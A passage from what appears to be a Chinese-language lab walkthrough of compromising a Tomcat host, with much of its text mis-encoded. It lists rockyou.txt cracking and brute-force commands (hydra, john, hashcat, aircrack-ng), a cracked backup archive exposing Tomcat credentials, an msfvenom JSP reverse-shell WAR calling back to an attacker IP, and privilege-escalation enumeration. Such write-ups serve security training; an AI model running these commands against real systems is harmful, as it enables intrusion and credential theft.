1);\">åœ¨ Kali </font><a href=\"https://so.csdn.net/so/search?q=Linux&amp;spm=1001.2101.3001.7020\" rel=\"noopener nofollow\" target=\"_blank\"><font style=\"color: rgba(252, 85, 49, 1);\">Linux</font></a><font style=\"color: rgba(77, 77, 77, 1);\"> ä¸­ï¼Œä½¿ç”¨ rockyou.txt ç ´è§£åŠ å¯†ä»£ç æˆ–å¯†ç çš„æ­¥éª¤å–å†³äºåŠ å¯†æ–¹å¼ï¼ˆå¦‚ ZIPã€RARã€HASHã€</font><font style=\"color: rgba(78, 161, 219, 1) !important;\">SSH</font><font style=\"color: rgba(77, 77, 77, 1);\">ã€FTP ç­‰ï¼‰</font></p>\n<p><strong>å¥½çš„ï¼Œè¿™æ˜¯ä¸€ä¸ªä»¥è¡¨æ ¼å½¢å¼æ•´ç†çš„ï¼Œåœ¨ Kali Linux ä¸­ä½¿ç”¨ <strong><code>**rockyou.txt**</code></strong> ç ´è§£ä¸åŒç±»å‹åŠ å¯†/ä¿æŠ¤çš„é€šç”¨æ­¥éª¤ã€‚è¡¨æ ¼æ¸…æ™°åœ°å±•ç¤ºäº†ä¸åŒåœºæ™¯ä¸‹çš„å·¥å…·ã€å‘½ä»¤å’Œæ ¸å¿ƒæ€è·¯ã€‚</strong></p>\n<p><strong>Kali Linux ä¸­ä½¿ç”¨ rockyou.txt è¿›è¡Œå¯†ç ç ´è§£</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">æ”»å‡»ç›®æ ‡ (åŠ å¯†/ä¿æŠ¤æ–¹å¼)</font></th>\n<th style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">æ ¸å¿ƒå·¥å…·</font></th>\n<th style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">å…³é”®å‡†å¤‡æ­¥éª¤ (åœ¨è¿è¡Œæ”»å‡»å‘½ä»¤å‰)</font></th>\n<th style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">å…¸å‹æ”»å‡»å‘½ä»¤ç¤ºä¾‹</font></th>\n<th style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">æ ¸å¿ƒæ€è·¯ä¸è¯´æ˜</font></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align: left;\"><strong>ZIP å‹ç¼©åŒ…</strong></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;fcrackzip&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">ç¡®ä¿ç›®æ ‡ ZIP æ–‡ä»¶åœ¨æœ¬æœºã€‚</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;rockyou.txt&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> é»˜è®¤è·¯å¾„ï¼š</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;/usr/share/wordlists/rockyou.txt&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;fcrackzip -v -D -p /usr/share/wordlists/rockyou.txt -u target.zip&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;-D&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> æŒ‡å®šå­—å…¸æ¨¡å¼ï¼Œ</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;-p&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> æŒ‡å®šå­—å…¸è·¯å¾„ï¼Œ</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;-u&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> éªŒè¯å¯†ç ã€‚æš´åŠ›ç ´è§£è€—æ—¶è¾ƒé•¿ï¼Œå­—å…¸æ”»å‡»æ•ˆç‡æ›´é«˜ã€‚</font></td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>RAR å‹ç¼©åŒ…</strong></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;rarcrack&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> æˆ– </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;john&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">1. </font><strong>ä½¿ç”¨ rarcrack</strong><font style=\"color: rgba(77, 77, 77, 1);\">ï¼š å®‰è£… </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;rarcrack&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> (</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;sudo apt install rarcrack&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\">)ã€‚</font><font style=\"color: rgba(77, 77, 77, 1);\">   </font><font style=\"color: rgba(77, 77, 77, 1);\">2. </font><strong>ä½¿ç”¨ John</strong><font style=\"color: rgba(77, 77, 77, 1);\">ï¼š éœ€å…ˆç”¨ </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;rar2john&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> æå–å“ˆå¸Œã€‚</font></td>\n<td style=\"text-align: left;\"><strong>1. rarcrack:</strong><font style=\"color: rgba(77, 77, 77, 1);\"> </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;rarcrack --type rar target.rar&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\">   </font><strong>2. john:</strong><font style=\"color: rgba(77, 77, 77, 1);\"> </font><font style=\"color: rgba(77, 77, 77, 1);\">   </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;rar2john target.rar &gt; rar_hash.txt&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\">   </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;rarcrack&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> æ”¯æŒè‡ªåŠ¨çŒœæµ‹ç±»å‹ï¼ˆXMLæ–‡ä»¶è®°å½•è¿›åº¦ï¼‰ã€‚John çš„æ–¹å¼æ›´é€šç”¨ï¼Œå…ˆæå–å“ˆå¸Œï¼Œå†å¯¹å“ˆå¸Œè¿›è¡Œç ´è§£ã€‚</font></td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>å¯†ç å“ˆå¸Œ (å¦‚ /etc/shadow ä¸­çš„ Hash)</strong></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;john&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> æˆ– </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hashcat&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">1. </font><strong>è·å–å“ˆå¸Œ</strong><font style=\"color: rgba(77, 77, 77, 1);\">ï¼š éœ€è¦å°† </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;/etc/shadow&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> ä¸ </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;/etc/passwd&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> åˆå¹¶æˆ–ç›´æ¥è·å¾—å“ˆå¸Œä¸²ã€‚</font><font style=\"color: rgba(77, 77, 77, 1);\">   </font><font style=\"color: rgba(77, 77, 77, 1);\">2. </font><strong>è¯†åˆ«å“ˆå¸Œç±»å‹</strong><font style=\"color: rgba(77, 77, 77, 1);\">ï¼š ä½¿ç”¨ </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hashid&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> æˆ– </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;john --list=formats&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> è¯†åˆ«ã€‚</font></td>\n<td style=\"text-align: left;\"><strong>ä»¥ John ç ´è§£ MD5 ä¸ºä¾‹:</strong><font style=\"color: rgba(77, 77, 77, 1);\">   </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_file.txt&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\">   </font><strong>ä»¥ hashcat ç ´è§£ SHA256 ä¸ºä¾‹:</strong><font style=\"color: rgba(77, 77, 77, 1);\">   </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hashcat -m 1400 -a 0 hash_file.txt /usr/share/wordlists/rockyou.txt&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><strong>æœ€å¸¸ç”¨åœºæ™¯</strong><font style=\"color: rgba(77, 77, 77, 1);\">ã€‚å…³é”®åœ¨äºæ­£ç¡®è¯†åˆ«å“ˆå¸Œç±»å‹ï¼ˆ</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;-m&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> æˆ– </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;--format&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\">ï¼‰ã€‚</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hashcat&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> æ€§èƒ½æ›´å¼ºï¼Œæ”¯æŒ GPUã€‚ç ´è§£æˆåŠŸç‡é«˜åº¦ä¾èµ–å­—å…¸è´¨é‡ã€‚</font></td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>SSH æœåŠ¡ç™»å½•</strong></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hydra&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> æˆ– </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;medusa&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">ç¡®è®¤ç›®æ ‡ä¸»æœº SSH æœåŠ¡ï¼ˆ22ç«¯å£ï¼‰å¼€æ”¾ï¼Œä¸”å…è®¸å¯†ç è®¤è¯ã€‚</font></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hydra -l &lt;ç”¨æˆ·å&gt; -P /usr/share/wordlists/rockyou.txt &lt;ç›®æ ‡IP&gt; ssh&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\">   </font><font style=\"color: rgba(77, 77, 77, 1);\">æˆ–æŒ‡å®šç”¨æˆ·åˆ—è¡¨ï¼š</font><font style=\"color: rgba(77, 77, 77, 1);\">   </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hydra -L user_list.txt -P /usr/share/wordlists/rockyou.txt ssh://&lt;ç›®æ ‡IP&gt;&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><strong>ç½‘ç»œåè®®çˆ†ç ´</strong><font style=\"color: rgba(77, 77, 77, 1);\">ã€‚</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;-l&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> æŒ‡å®šå•ä¸ªç”¨æˆ·ï¼Œ</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;-L&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> æŒ‡å®šç”¨æˆ·å­—å…¸ã€‚æ³¨æ„ï¼šé¢‘ç¹å°è¯•å¯èƒ½è§¦å‘é”å®šæˆ–è®°å½•æ—¥å¿—ã€‚</font></td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>FTP æœåŠ¡ç™»å½•</strong></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hydra&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">ç¡®è®¤ç›®æ ‡ä¸»æœº FTP æœåŠ¡ï¼ˆ21ç«¯å£ï¼‰å¼€æ”¾ã€‚</font></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hydra -l &lt;ç”¨æˆ·å&gt; -P /usr/share/wordlists/rockyou.txt ftp://&lt;ç›®æ ‡IP&gt;&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\">   </font><font style=\"color: rgba(77, 77, 77, 1);\">æˆ–åŒ¿åæµ‹è¯•ï¼š</font><font style=\"color: rgba(77, 77, 77, 1);\">   </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hydra -l anonymous -P â€˜â€™ ftp://&lt;ç›®æ ‡IP&gt;&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">æ€è·¯åŒ SSHã€‚é€šå¸¸å…ˆå°è¯• </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;anonymous&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> åŒ¿åç™»å½•ã€‚</font></td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>HTTP è¡¨å•ç™»å½• (å¦‚ Web åå°)</strong></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hydra&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">1. åˆ†æç™»å½•è¯·æ±‚ï¼ˆç”¨ Burp Suite æŠ“åŒ…ï¼‰ã€‚</font><font style=\"color: rgba(77, 77, 77, 1);\">   </font><font style=\"color: rgba(77, 77, 77, 1);\">2. ç¡®å®šç™»å½• URLã€ç”¨æˆ·å/å¯†ç å‚æ•°åã€å¤±è´¥å“åº”ç‰¹å¾ã€‚</font></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hydra -l admin -P /usr/share/wordlists/rockyou.txt &lt;ç›®æ ‡IP&gt; http-post-form \"/login.php:user=^USER^&amp;pass=^PASS^:F=ç™»å½•å¤±è´¥\"&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><strong>POST æ•°æ®åŒ…çˆ†ç ´</strong><font style=\"color: rgba(77, 77, 77, 1);\">ã€‚è¯­æ³•å¤æ‚ä½†çµæ´»ã€‚</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;^USER^&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> å’Œ </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;^PASS^&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> æ˜¯å ä½ç¬¦ï¼Œ</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;F=...&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> æŒ‡å®šå¤±è´¥å­—ç¬¦ä¸²ã€‚æˆåŠŸç‡å–å†³äºè¯·æ±‚æ„é€ çš„å‡†ç¡®æ€§ã€‚</font></td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>WordPress åå°</strong></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;wpscan&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">ç¡®è®¤ç›®æ ‡ä¸º WordPress ç«™ç‚¹ã€‚</font></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;wpscan --url http://&lt;ç›®æ ‡ç«™ç‚¹&gt; --passwords /usr/share/wordlists/rockyou.txt --usernames admin&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">ä¸“é—¨é’ˆå¯¹ WordPress çš„å·¥å…·ï¼Œæ¯”é€šç”¨ HTTP çˆ†ç ´æ›´æ™ºèƒ½ï¼Œèƒ½æšä¸¾ç”¨æˆ·åå¹¶è§„é¿éƒ¨åˆ†é”å®šæœºåˆ¶ã€‚</font></td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>Wi-Fi WPA/WPA2 æ¡æ‰‹åŒ…</strong></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;aircrack-ng&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">1. å·²é€šè¿‡ </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;airodump-ng&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> æ•è·åˆ°åŒ…å«å››æ­¥æ¡æ‰‹çš„ </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;.cap&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> æ–‡ä»¶ã€‚</font><font style=\"color: rgba(77, 77, 77, 1);\">   </font><font style=\"color: rgba(77, 77, 77, 1);\">2. ç¡®è®¤æ¡æ‰‹åŒ…æœ‰æ•ˆï¼ˆ</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;aircrack-ng&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> èƒ½è¯†åˆ«ï¼‰ã€‚</font></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;aircrack-ng -w /usr/share/wordlists/rockyou.txt capture_file.cap&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><strong>ç¦»çº¿ç ´è§£æ— çº¿å¯†ç </strong><font style=\"color: rgba(77, 77, 77, 1);\">ã€‚æ ¸å¿ƒæ˜¯æ•è·åˆ°ç”¨æˆ·è¿æ¥æ—¶çš„æ¡æ‰‹åŒ…ã€‚ç ´è§£é€Ÿåº¦å–å†³äºå¯†ç åœ¨å­—å…¸ä¸­çš„ä½ç½®åŠç¡¬ä»¶ç®—åŠ›ã€‚</font></td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>åŠ å¯†çš„ PDF æ–‡ä»¶</strong></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;john&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> æˆ– </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;pdfcrack&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">ä½¿ç”¨ </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;pdf2john&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> æˆ– </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;pdfcrack&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> æå–æˆ–ç›´æ¥ç ´è§£ã€‚</font></td>\n<td style=\"text-align: left;\"><strong>ä½¿ç”¨ John:</strong><font style=\"color: rgba(77, 77, 77, 1);\">   </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;pdf2john target.pdf &gt; pdf_hash.txt&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\">   </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\">   </font><strong>ä½¿ç”¨ pdfcrack:</strong><font style=\"color: rgba(77, 77, 77, 1);\">   </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;pdfcrack -f target.pdf -w /usr/share/wordlists/rockyou.txt&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">æ€è·¯ä¸ RAR ç±»ä¼¼ï¼Œå…ˆæå–å¯†ç å“ˆå¸Œï¼ˆå¦‚æœæ”¯æŒï¼‰ï¼Œå†ç”¨å­—å…¸æ”»å‡»ã€‚</font></td>\n</tr>\n</tbody>\n</table>\n<p><strong>å­—å…¸è·¯å¾„</strong><font style=\"color: rgba(77, 77, 77, 1);\">ï¼š </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;rockyou.txt&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> é»˜è®¤ä½äº </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;/usr/share/wordlists/&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\">ã€‚é¦–æ¬¡ä½¿ç”¨å¯èƒ½éœ€è¦è§£å‹ï¼š</font></p>\n<pre><code class=\"language-bash\">sudo gunzip /usr/share/wordlists/rockyou.txt.gz\n</code></pre>\n<p>çˆ†ç ´ï¼š</p>\n<pre><code class=\"language-plain\">â”Œâ”€â”€(rootã‰¿xiao)-[/opt]\nâ””â”€# fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip\n\n\nPASSWORD FOUND!!!!: pw == @administrator_hi5\n</code></pre>\n<p>å¾—åˆ°å¯†ç ï¼š@administrator_hi5</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767840515850-f1235a74-7eea-49a5-b887-170449b7c94b.png\" /></p>\n<p><strong>è§£å‹æŸ¥çœ‹è§£å‹å‡ºæ¥çš„å†…å®¹ï¼š</strong></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767840578959-7f6785d8-85b1-4677-b602-ab5675acc354.png\" /></p>\n<p><strong>åœ¨tomcat-user.xmlæ–‡ä»¶ä¸­å‘ç°ä¸¤ä¸ªè´¦æˆ·å’Œå¯†ç </strong></p>\n<pre><code class=\"language-xml\">&lt;role rolename=\"manager-gui\"/&gt;\n&lt;user username=\"manager\" password=\"melehifokivai\" roles=\"manager-gui\"/&gt;\n\n&lt;role rolename=\"admin-gui\"/&gt;\n&lt;user username=\"admin\" password=\"melehifokivai\" roles=\"admin-gui, manager-gui\"/&gt;\n&lt;/tomcat-users&gt;\n</code></pre>\n<p><strong>è´¦å·1ï¼šmanager melehifokivai</strong></p>\n<p><strong>è´¦å·2ï¼šadmin melehifokivai</strong></p>\n<p><strong>è´¦å·ç™»å½•</strong></p>\n<p>æµ‹è¯•è§£å‹å¾—åˆ°çš„è´¦å·å¯†ç </p>\n<p>adminå’Œmanagerè´¦æˆ·éƒ½èƒ½ç™»å½•æˆåŠŸ</p>\n<p><a href=\"http://192.168.222.134:8080/manager/html\" rel=\"noopener nofollow\" target=\"_blank\">http://192.168.222.134:8080/manager/html</a></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767840894776-7a0986dc-ade3-4785-8e77-a35781f0265f.png\" /></p>\n<p>å‘ç°æ–‡ä»¶ä¸Šä¼ ï¼Œå¯ä¸Šä¼ æ–‡ä»¶ä¸º<font style=\"color: rgba(0, 0, 0, 1);\">WARæ–‡ä»¶</font></p>\n<p>è®¿é—®http://192.168.222.134:8080/readme.txt</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767841873877-cea13c4e-60ed-4e79-8b33-c75c05dc2b80.png\" /></p>\n<p>å¾—åˆ°ä¿¡æ¯æœ‰ä¸€ä¸ªåŠ å¯†æ–‡ä»¶çŒœæµ‹æ˜¯backup.zipï¼ŒçŒœæµ‹ç®¡ç†å‘˜ä¸º<strong><font style=\"color: rgba(0, 0, 0, 1);\">randyï¼Œ</font></strong></p>\n<h1 id=\"0x02æ¼æ´åˆ©ç”¨-\"><font style=\"color: rgba(0, 0, 0, 1);\">0x02æ¼æ´åˆ©ç”¨ </font></h1>\n<h2 id=\"21toncatä¸­waræ–‡ä»¶ä¸Šä¼ -shell\">2.1toncatä¸­waræ–‡ä»¶ä¸Šä¼ -shell</h2>\n<p>msfç”Ÿæˆ<font style=\"color: rgba(15, 17, 21, 1);\">JSP åå‘ Shell çš„ WAR æ–‡ä»¶</font></p>\n<pre><code class=\"language-python\">sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"192.168.222.137\" LPORT=8888 -f war &gt; shell.war\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768298973138-a6d047cf-fa8e-4324-a965-7454625b213a.png\" /></p>\n<p>ä¸Šä¼ </p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768299005190-63e670bc-10ff-40ee-a505-597111589c12.png\" /></p>\n<p>åå¼¹shell</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768299028082-c119a58c-a87b-4310-9efa-adc162f66a48.png\" /></p>\n<p><font style=\"color: rgba(85, 86, 102, 1); background-color: rgba(238, 240, 244, 1);\">GetShellä¹‹åï¼Œé€šè¿‡ä¸€æ®µpythonä»£ç åˆ›å»ºè¦ç»™äº¤äº’å¼ç»ˆç«¯ã€‚</font></p>\n<pre><code class=\"language-python\">python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768299297993-388f1683-17d1-41a5-a67d-c0bd5193a25c.png\" /></p>\n<pre><code class=\"language-python\"># æŸ¥è¯¢å…·å¤‡suidæ ‡å¿—çš„æ–‡ä»¶\nfind / -perm -u=s -type f 2&gt;&gt;/dev/null\n# æŸ¥è¯¢å½“å‰ç”¨æˆ·æ˜¯å¦æœ‰å¯åˆ©ç”¨sudoææƒçš„å‘½ä»¤\nsudo -l\n# æŸ¥çœ‹å¤‡ä»½æ–‡ä»¶\nfind / -name \"*backup*\" 2&gt;&gt;/dev/null\n</code></pre>\n<p>æŸ¥çœ‹homeç›®å½•ä¸‹é¢æœ‰ä¸¤ä¸ªç”¨æˆ·ï¼šjaye  randy</p>\n<p>ç»“åˆä¹‹å‰çš„è´¦å·å¯†ç æ¥å¯†ç çŒœæµ‹ï¼š</p>\n<p>å¾—åˆ°ï¼šjaye <strong>melehifokivai</strong></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768300529905-de5d14bc-0e9c-44cc-9d2d-4bcf17e4f845.png\" /></p>\n<p>waræ–‡ä»¶ä¸Šä¼ ï¼š</p>\n<p><strong><font style=\"color: rgba(51, 51, 51, 1);\">WARï¼ˆWeb Application Archiveï¼‰</font></strong><font style=\"color: rgba(51, 51, 51, 1);\"> æ˜¯ Java Web åº”ç”¨ç¨‹åºçš„æ ‡å‡†æ‰“åŒ…æ ¼å¼ï¼Œä¸“ä¸ºéƒ¨ç½²åˆ° </font><strong><font style=\"color: rgba(51, 51, 51, 1);\">Servlet å®¹å™¨</font></strong><font style=\"color: rgba(51, 51, 51, 1);\">ï¼ˆå¦‚ Tomcatã€Jettyï¼‰è€Œè®¾è®¡ã€‚å®ƒæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼ˆæ‰©å±•åä¸º </font><code>&lt;font style=\"color:rgb(192, 52, 29);background-color:rgba(0, 0, 0, 0.04);\"&gt;.war&lt;/font&gt;</code><font style=\"color: rgba(51, 51, 51, 1);\">ï¼‰ï¼Œéµå¾ªç‰¹å®šçš„ç›®å½•ç»“æ„ï¼ŒåŒ…å« Web åº”ç”¨çš„æ‰€æœ‰ä»£ç ã€èµ„æºåŠé…ç½®ã€‚</font><br />\nä¸€èˆ¬æƒ…å†µåˆ©ç”¨æ€è·¯ï¼š<br />\njspé©¬è½¬æ¢ä¸ºwaråŒ…ä¸Šä¼ </p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767861822414-ded9f771-cd70-4a24-9d87-89814e4b38be.png\" /></p>\n<h2 id=\"22-msfæ¼æ´åˆ©ç”¨-shell\"><font style=\"color: rgba(15, 17, 21, 1);\">2.2 msfæ¼æ´åˆ©ç”¨-shell</font></h2>\n<p><font style=\"color: rgba(29, 33, 41, 1); background-color: rgba(247, 248, 250, 1);\">msf æœ‰Tomcat ä¸Šä¼ webshellçš„æ¨¡å—ï¼Œæœ‰ç”¨æˆ·åå’Œå¯†ç å°±å¯ä»¥ä½¿ç”¨ï¼š</font></p>\n<pre><code class=\"language-python\">search tomcat upload\nuse 7\nshow options\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767847629830-5bfe712d-d3c4-4308-951e-91ce56938d85.png\" /></p>\n<p>æŸ¥çœ‹éœ€è¦è®¾ç½®çš„å‚æ•°</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767847669431-ba4df25a-d852-458b-8bb2-5a6692fab9b9.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767848191317-43a10ac8-f784-4c8f-83d5-eb2640f729fa.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767848225249-ef26df62-a3ce-48d8-9bb3-3c3dea3892ae.png\" /></p>\n\n<p><img alt=\"\" 